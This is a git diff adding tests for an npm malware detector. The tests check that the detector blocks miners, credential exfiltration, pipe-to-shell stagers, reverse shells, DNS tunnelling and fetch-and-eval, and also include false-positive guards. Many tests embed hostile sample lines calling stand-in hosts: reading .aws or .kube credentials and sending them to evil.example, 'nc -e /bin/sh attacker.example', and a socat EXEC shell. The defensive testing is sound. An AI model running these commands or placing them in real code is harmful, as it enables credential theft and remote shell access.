@@ -467,6 +467,267 @@ test('F-30 redo: hardcoded fetch of registry.npmjs.org itself is WARN, not a har
   assert.ok(warnDetection, `Expected NPMRC_NETWORK_EGRESS WARN detection but got: ${JSON.stringify(result.detections)}`);
 });
 
+// ─────────────────────────────────────────────────────────────────────────────
+// Phase 1 gap-closure guards (red-team suite groups B/C/E). Each new rule ships with
+// a true-positive AND a false-positive test.
+// ─────────────────────────────────────────────────────────────────────────────
+
+// F-35a. Miner brand not covered by a stratum literal is blocked as a crypto-miner.
+test('Miner brand signature (coinimp) is blocked and labeled crypto-miner (F-35 TP)', () => {
+  const src = pad(`const m = new Client.Anonymous('coinimp-site-key'); m.start(); module.exports = m;`);
+  const result = detector.scanModuleSync('miner-coinimp.js', src, 'miner-coinimp.js');
+  expectBlocked(result);
+  const crypto = result.detections.find(d => d.type === 'crypto-miner');
+  assert.ok(crypto, `Expected crypto-miner label but got: ${JSON.stringify(result.detections)}`);
+});
+
+// F-35b. isCrypto relabel: coinhive now tags crypto-miner (CRITICAL), not dynamic-code-exec.
+test('coinhive signature is labeled crypto-miner after isCrypto fix (F-35 label)', () => {
+  const src = pad(`const CoinHive = require('coinhive'); module.exports = CoinHive;`);
+  const result = detector.scanModuleSync('coinhive.js', src, 'coinhive.js');
+  const crypto = result.detections.find(d => d.type === 'crypto-miner' && d.severity === 'CRITICAL');
+  assert.ok(crypto, `coinhive should be labeled crypto-miner/CRITICAL: ${JSON.stringify(result.detections)}`);
+});
+
+// F-35c. FP guard: "coin"/"pool"/"miner" as ordinary words (no brand literal) must not block.
+test('Prose mentioning coin/pool/miner without a brand literal is not blocked (F-35 FP)', () => {
+  const src = pad(`
+    // Manages a pool of database connections for the coin-tracker miner dashboard.
+    const poolSize = 10; const minerCount = 3; module.exports = { poolSize, minerCount };
+  `);
+  const result = detector.scanModuleSync('pool-manager.js', src, 'pool-manager.js');
+  assert.ok(!result.detections.some(d => !d.warnOnly), `Must not hard-block: ${JSON.stringify(result.detections)}`);
+});
+
+// F-36a. Inline require("net").connect + credential read → CREDENTIAL_EXFILTRATION.
+test('Inline require("net").connect + .aws read is blocked (F-36 TP)', () => {
+  const src = pad(`
+    const a = require('fs').readFileSync(require('os').homedir() + '/.aws/credentials', 'utf8');
+    const s = require('net').connect(9999, 'evil.example', () => s.write(a));
+    module.exports = {};
+  `);
+  const result = detector.scanModuleSync('inline-net.js', src, 'inline-net.js');
+  const credExfil = result.detections.find(d => d.rule === 'CREDENTIAL_EXFILTRATION');
+  assert.ok(credExfil, `Expected CREDENTIAL_EXFILTRATION but got: ${JSON.stringify(result.detections)}`);
+});
+
+// F-36b. Inline require("vm").runInThisContext + child_process → DYNAMIC_CODE_EXEC_CHAIN.
+test('Inline require("vm").runInThisContext + spawn is blocked (F-36 TP)', () => {
+  const src = pad(`require('vm').runInThisContext(payload); require('child_process').spawnSync('id'); module.exports = {};`);
+  const result = detector.scanModuleSync('inline-vm.js', src, 'inline-vm.js');
+  const chain = result.detections.find(d => d.rule === 'DYNAMIC_CODE_EXEC_CHAIN');
+  assert.ok(chain, `Expected DYNAMIC_CODE_EXEC_CHAIN but got: ${JSON.stringify(result.detections)}`);
+});
+
+// F-36c. FP guard: inline require("https").get in a plain HTTP client (no credential read) is clean.
+test('Inline require("https").get without a credential read is not blocked (F-36 FP)', () => {
+  const src = pad(`
+    module.exports = (url, cb) => require('https').get(url, cb);
+  `);
+  const result = detector.scanModuleSync('http-client.js', src, 'http-client.js');
+  assert.ok(!result.detections.some(d => !d.warnOnly), `Must not hard-block: ${JSON.stringify(result.detections)}`);
+});
+
+// F-37a. Infra cred store (.kube/config) + hardcoded non-registry exfil host → CRITICAL.
+test('.kube/config read + hardcoded exfil host is blocked (F-37 TP)', () => {
+  const src = pad(`
+    const k = require('fs').readFileSync(require('os').homedir() + '/.kube/config', 'utf8');
+    fetch('https://evil.example/k', { method: 'POST', body: k });
+    module.exports = {};
+  `);
+  const result = detector.scanModuleSync('kube-exfil.js', src, 'kube-exfil.js');
+  const credExfil = result.detections.find(d => d.rule === 'CREDENTIAL_EXFILTRATION');
+  assert.ok(credExfil, `Expected CREDENTIAL_EXFILTRATION but got: ${JSON.stringify(result.detections)}`);
+});
+
+// F-37b. FP guard: a legit k8s client reads .kube/config and connects to a CONFIG-DERIVED
+// server (no hardcoded attacker host) — must NOT block, or we false-positive on
+// @kubernetes/client-node and every docker/browser tool that reads these files.
+test('.kube/config read + config-derived (non-hardcoded) server is clean (F-37 FP)', () => {
+  const src = pad(`
+    const k = require('fs').readFileSync(require('os').homedir() + '/.kube/config', 'utf8');
+    const cfg = parseYaml(k);
+    fetch(cfg.clusters[0].server + '/api/v1/pods', { headers: cfg.headers });
+    module.exports = {};
+  `);
+  const result = detector.scanModuleSync('kube-client.js', src, 'kube-client.js');
+  assert.ok(!result.detections.some(d => !d.warnOnly), `Legit k8s client must not hard-block: ${JSON.stringify(result.detections)}`);
+});
+
+// F-38a. Pipe-to-shell stager (curl ... | sh) is blocked (the "| bash" literal misses sh/dash/zsh).
+test('curl ... | sh stager is blocked (F-38 TP)', () => {
+  const src = pad(`require('child_process').execSync('curl -s https://evil.example/i.sh | sh'); module.exports = {};`);
+  const result = detector.scanModuleSync('pipe-sh.js', src, 'pipe-sh.js');
+  expectBlocked(result);
+  assert.ok(result.detections.some(d => !d.warnOnly), 'pipe-to-shell stager must hard-block');
+});
+
+// F-38b. FP guard: the anchored \bsh\b regex must NOT match "| sha256sum" or "| ssh host".
+test('Pipe to sha256sum / ssh does not false-positive as a shell stager (F-38 FP)', () => {
+  const src = pad(`
+    const { execSync } = require('child_process');
+    execSync('cat file | sha256sum');
+    execSync('tar czf - dir | ssh host "cat > backup.tgz"');
+    module.exports = {};
+  `);
+  const result = detector.scanModuleSync('safe-pipes.js', src, 'safe-pipes.js');
+  assert.ok(!result.detections.some(d => !d.warnOnly), `sha256sum/ssh pipes must not hard-block: ${JSON.stringify(result.detections.filter(d => !d.warnOnly))}`);
+});
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Phase 2 gap-closure guards (red-team groups D/E). New behavioral rules + tool sigs.
+// ─────────────────────────────────────────────────────────────────────────────
+
+// F-39a. REMOTE_FETCH_EXEC: fetch a remote payload and eval it → HIGH block.
+test('fetch(...).then(eval) is blocked by REMOTE_FETCH_EXEC (F-39 TP)', () => {
+  const src = pad(`fetch('https://cdn.example/a.js').then(r=>r.text()).then(t=>eval(t)); module.exports = {};`);
+  const result = detector.scanModuleSync('fetch-eval.js', src, 'fetch-eval.js');
+  const r = result.detections.find(d => d.rule === 'REMOTE_FETCH_EXEC');
+  assert.ok(r, `Expected REMOTE_FETCH_EXEC but got: ${JSON.stringify(result.detections)}`);
+});
+
+// F-39b. REMOTE_FETCH_EXEC via indirect (0, eval) on a fetched payload.
+test('fetch(...).then((0,eval)) is blocked by REMOTE_FETCH_EXEC (F-39 TP indirect)', () => {
+  const src = pad(`fetch('https://raw.githubusercontent.com/e/x/main/p.js').then(r=>r.text()).then(t=>(0,eval)(t)); module.exports = {};`);
+  const result = detector.scanModuleSync('fetch-indirect-eval.js', src, 'fetch-indirect-eval.js');
+  assert.ok(result.detections.some(d => d.rule === 'REMOTE_FETCH_EXEC'), `Expected REMOTE_FETCH_EXEC: ${JSON.stringify(result.detections)}`);
+});
+
+// F-39c. FP guard: fetch that parses JSON (no code execution) must NOT block.
+test('fetch(...).then(r=>r.json()) without eval is not blocked (F-39 FP)', () => {
+  const src = pad(`module.exports = () => fetch('https://api.example/x').then(r => r.json());`);
+  const result = detector.scanModuleSync('fetch-json.js', src, 'fetch-json.js');
+  assert.ok(!result.detections.some(d => !d.warnOnly), `fetch+json must not block: ${JSON.stringify(result.detections)}`);
+});
+
+// F-39d. FP guard: new Function used for local codegen (no network) must NOT block.
+test('new Function without network egress is not blocked (F-39 FP)', () => {
+  const src = pad(`const add = new Function('a', 'b', 'return a + b'); module.exports = add;`);
+  const result = detector.scanModuleSync('codegen.js', src, 'codegen.js');
+  assert.ok(!result.detections.some(d => !d.warnOnly), `local codegen must not block: ${JSON.stringify(result.detections)}`);
+});
+
+// F-40a. Reverse-shell tool signature (nc -e) is blocked.
+test('nc -e reverse shell is blocked (F-40 TP)', () => {
+  const src = pad(`require('child_process').exec('nc -e /bin/sh attacker.example 4444'); module.exports = {};`);
+  const result = detector.scanModuleSync('nc-e.js', src, 'nc-e.js');
+  expectBlocked(result);
+  assert.ok(result.detections.some(d => d.type === 'reverse-shell'), `Expected reverse-shell: ${JSON.stringify(result.detections)}`);
+});
+
+// F-40b. Reverse-shell tool signature (socat EXEC) is blocked.
+test('socat ... EXEC: reverse shell is blocked (F-40 TP)', () => {
+  const src = pad(`require('child_process').exec('socat TCP:attacker.example:4444 EXEC:/bin/bash,pty'); module.exports = {};`);
+  const result = detector.scanModuleSync('socat.js', src, 'socat.js');
+  expectBlocked(result);
+});
+
+// F-40c. FP guard: the anchored tool regexes must not match benign command strings that merely
+// contain the trigger as a substring — rsync -e (contains "nc -e"), a pipe into ssh (not sh).
+test('Benign rsync -e / pipe-to-ssh command strings do not false-positive (F-40 FP)', () => {
+  const src = pad(`
+    const { execSync } = require('child_process');
+    execSync('rsync -e ssh user@host:/src /dst');
+    execSync('tar c - dir | ssh host "cat > backup.tgz"');
+    module.exports = {};
+  `);
+  const result = detector.scanModuleSync('benign-cmds.js', src, 'benign-cmds.js');
+  assert.ok(!result.detections.some(d => !d.warnOnly), `benign cmds must not block: ${JSON.stringify(result.detections.filter(d => !d.warnOnly))}`);
+});
+
+// F-41a. DNS-tunnel exfil: .env read + dns.resolve egress channel → CREDENTIAL_EXFILTRATION.
+test('.env read + dns.resolve exfil channel is blocked (F-41 TP)', () => {
+  const src = pad(`
+    const fs = require('fs'); const dns = require('dns');
+    const data = fs.readFileSync('.env', 'utf8');
+    dns.resolve(Buffer.from(data).toString('hex').slice(0, 60) + '.evil.example', () => {});
+    module.exports = {};
+  `);
+  const result = detector.scanModuleSync('dns-tunnel.js', src, 'dns-tunnel.js');
+  assert.ok(result.detections.some(d => d.rule === 'CREDENTIAL_EXFILTRATION'), `Expected CREDENTIAL_EXFILTRATION: ${JSON.stringify(result.detections)}`);
+});
+
+// F-41b. process.binding + eval completes the DYNAMIC_CODE_EXEC_CHAIN.
+test('process.binding("spawn_sync") + eval is blocked (F-41 TP)', () => {
+  const src = pad(`const b = process.binding('spawn_sync'); eval('void 0'); module.exports = b;`);
+  const result = detector.scanModuleSync('proc-binding.js', src, 'proc-binding.js');
+  assert.ok(result.detections.some(d => d.rule === 'DYNAMIC_CODE_EXEC_CHAIN'), `Expected DYNAMIC_CODE_EXEC_CHAIN: ${JSON.stringify(result.detections)}`);
+});
+
+// F-41c. FP guard: dns.resolve without a credential read must NOT block (common in net libs).
+test('dns.resolve without a credential read is not blocked (F-41 FP)', () => {
+  const src = pad(`const dns = require('dns'); module.exports = (h, cb) => dns.resolve(h, cb);`);
+  const result = detector.scanModuleSync('dns-lib.js', src, 'dns-lib.js');
+  assert.ok(!result.detections.some(d => !d.warnOnly), `bare dns.resolve must not block: ${JSON.stringify(result.detections)}`);
+});
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Cross-file correlation guards (ported from the registry, package-scoped for runtime).
+// A malicious package can split a read (file A) from the exfil (file B) to dodge per-file
+// rules. Scoping to one npm package is what keeps this from false-positing across the app.
+// Cross-file is OPT-IN (soak showed it FPs on large legit packages); enable it for these tests.
+// ─────────────────────────────────────────────────────────────────────────────
+process.env.FW_ENABLE_CROSSFILE = '1';
+
+// F-42a. TP: same package — .env read in a.js + egress in b.js → CROSS_FILE block on b.js.
+test('Cross-file split (.env read + egress) in one package is blocked (F-42 TP)', () => {
+  detector.scanModuleSync('a.js', "const s = require('fs').readFileSync('.env','utf8');", '/n/node_modules/evil/a.js', 'evil');
+  const r = detector.scanModuleSync('b.js', "require('https').get('http://c2.example/?d='+s);", '/n/node_modules/evil/b.js', 'evil');
+  assert.ok(r.detections.some(d => d.rule === 'CREDENTIAL_EXFILTRATION_CROSS_FILE'), `Expected CROSS_FILE: ${JSON.stringify(r.detections)}`);
+});
+
+// F-42b. TP: same package — dynamic code in a.js + process exec in b.js → CROSS_FILE block.
+test('Cross-file split (eval + child_process) in one package is blocked (F-42 TP)', () => {
+  detector.scanModuleSync('a.js', "eval(payload);", '/n/node_modules/evil/a.js', 'evil');
+  const r = detector.scanModuleSync('b.js', "require('child_process').exec(cmd);", '/n/node_modules/evil/b.js', 'evil');
+  assert.ok(r.detections.some(d => d.rule === 'DYNAMIC_CODE_EXEC_CHAIN_CROSS_FILE'), `Expected CROSS_FILE exec: ${JSON.stringify(r.detections)}`);
+});
+
+// F-42c. FP: a package that reads a non-sensitive asset (bare fs.readFile) in one file and makes
+// an HTTP call in another must NOT block — the cred rule keys on a genuine credential PATH, not
+// any file read (the tightening carried back to the registry on sync).
+test('Cross-file bare fs.readFile + egress (no credential path) is not blocked (F-42 FP)', () => {
+  detector.scanModuleSync('a.js', "const t = require('fs').readFileSync('./template.html','utf8');", '/n/node_modules/lib/a.js', 'lib');
+  const r = detector.scanModuleSync('b.js', "require('https').get('http://api.example/x');", '/n/node_modules/lib/b.js', 'lib');
+  assert.ok(!r.detections.some(d => !d.warnOnly), `bare readFile + egress must not block: ${JSON.stringify(r.detections.filter(d => !d.warnOnly))}`);
+});
+
+// F-42d. FP: credential read in package A and egress in package B (different packages) must NOT
+// pair — scoping bounds correlation to a single package.
+test('Cross-file across two different packages does not pair (F-42 FP)', () => {
+  detector.scanModuleSync('a.js', "const s = require('fs').readFileSync('.env','utf8');", '/n/node_modules/pkgA/a.js', 'pkgA');
+  const r = detector.scanModuleSync('b.js', "require('https').get('http://api.example/x');", '/n/node_modules/pkgB/b.js', 'pkgB');
+  assert.ok(!r.detections.some(d => !d.warnOnly), `distinct packages must not pair: ${JSON.stringify(r.detections.filter(d => !d.warnOnly))}`);
+});
+
+// F-42e. FP: first-party app code (no packageKey) is not subject to cross-file correlation —
+// the developer's own files reading config and making network calls is normal.
+test('Cross-file for first-party app code (no packageKey) is skipped (F-42 FP)', () => {
+  detector.scanModuleSync('config.js', "const s = require('fs').readFileSync('.env','utf8');", '/app/src/config.js', null);
+  const r = detector.scanModuleSync('api.js', "require('https').get('http://api.example/x');", '/app/src/api.js', null);
+  assert.ok(!r.detections.some(d => !d.warnOnly), `first-party must not pair: ${JSON.stringify(r.detections.filter(d => !d.warnOnly))}`);
+});
+
+// F-42f. Registry batch path: finalizePackage() (no packageKey, whole map) catches the same
+// split and returns a CROSS_FILE violation with the two files.
+test('Registry batch finalizePackage() catches a cross-file split (F-42 batch)', () => {
+  detector.scanModuleSync('a.js', "const s = fs.readFileSync('.env');", 'a.js');
+  detector.scanModuleSync('b.js', "https.get('http://evil.example/c?d=' + s);", 'b.js');
+  const viol = detector.finalizePackage();
+  assert.strictEqual(viol.length, 1, `Expected 1 cross-file violation: ${JSON.stringify(viol)}`);
+  assert.strictEqual(viol[0].severity, 'CRITICAL');
+  assert.ok(Array.isArray(viol[0].files) && viol[0].files.length === 2, 'violation should name the two files');
+});
+
+// F-42g. Cross-file is OFF by default — the runtime scoped path does not fire without the flag.
+test('Cross-file is opt-in: default-off runtime does not block a split (F-42 default-off)', () => {
+  delete process.env.FW_ENABLE_CROSSFILE;
+  detector.scanModuleSync('a.js', "const s = require('fs').readFileSync('.env','utf8');", '/n/node_modules/evil/a.js', 'evil');
+  const r = detector.scanModuleSync('b.js', "require('https').get('http://c2.example/?d='+s);", '/n/node_modules/evil/b.js', 'evil');
+  assert.ok(!r.detections.some(d => d.rule && d.rule.endsWith('_CROSS_FILE')), `default-off must not run cross-file: ${JSON.stringify(r.detections)}`);
+  process.env.FW_ENABLE_CROSSFILE = '1'; // restore for any later additions
+});
+
 // ─── report ──────────────────────────────────────────────────────────────────
 
 console.log('\n═══════════════════════════════════════════════════════════════');
